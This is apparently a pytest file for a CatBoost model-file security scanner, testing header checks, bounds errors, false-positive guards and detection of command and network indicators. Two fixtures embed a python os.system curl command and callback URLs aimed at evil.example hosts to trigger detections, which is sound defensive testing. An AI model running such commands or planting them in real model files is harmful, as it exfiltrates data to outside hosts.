"""Tests for CatBoost .cbm scanner."""

from __future__ import annotations

import struct
from pathlib import Path

from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.catboost_scanner import CatBoostScanner
from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic


def _build_cbm(core_strings: list[str], trailing_strings: list[str] | None = None) -> bytes:
    core_blob = b"\x00".join(s.encode("utf-8") for s in core_strings)
    trailing_blob = b"\x00".join(s.encode("utf-8") for s in (trailing_strings or []))
    return b"CBM1" + struct.pack("<I", len(core_blob)) + core_blob + trailing_blob


def test_can_handle_valid_cbm_file(tmp_path: Path) -> None:
    model_path = tmp_path / "safe.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "loss_function",
                "metadata",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    assert CatBoostScanner.can_handle(str(model_path)) is True


def test_can_handle_rejects_non_cbm_content_with_cbm_extension(tmp_path: Path) -> None:
    fake_path = tmp_path / "renamed.cbm"
    fake_path.write_bytes(b"not a catboost model")

    assert CatBoostScanner.can_handle(str(fake_path)) is False


def test_scan_benign_cbm_has_no_critical_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "benign.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "system_temperature",
                "exec_time_ms",
                "cat_feature_hash_to_string",
                "class_names",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)

    header_checks = [check for check in result.checks if check.name == "CatBoost Header Signature Check"]
    assert header_checks
    assert header_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_cbm_reports_structured_parse_failure(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    # Declared core size is larger than the available data.
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is False
    assert any(
        check.name == "CatBoost Core Section Bounds Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "CatBoost Structure Parsing" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
                "callback=https://evil.example/webhook",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    correlation_checks = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert correlation_checks
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL


def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
    model_path = tmp_path / "network.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "download_url=https://collector.evil.example/upload",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    network_checks = [check for check in result.checks if check.name == "Network Indicator Check"]
    assert network_checks
    assert network_checks[0].status == CheckStatus.FAILED
    assert network_checks[0].severity == IssueSeverity.WARNING


def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
    model_path = tmp_path / "false_positive_guard.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_system",
                "exec_time_ms",
                "system_feature_importance",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    command_correlation = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert command_correlation
    assert command_correlation[0].status == CheckStatus.PASSED
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_catboost_regression_routes_to_catboost_scanner(tmp_path: Path) -> None:
    model_path = tmp_path / "route.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "loss_function"]))

    scanner = get_scanner_for_file(str(model_path))

    assert scanner is not None
    assert scanner.name == "catboost"

    assert detect_file_format_from_magic(str(model_path)) == "catboost"
    assert detect_file_format(str(model_path)) == "catboost"
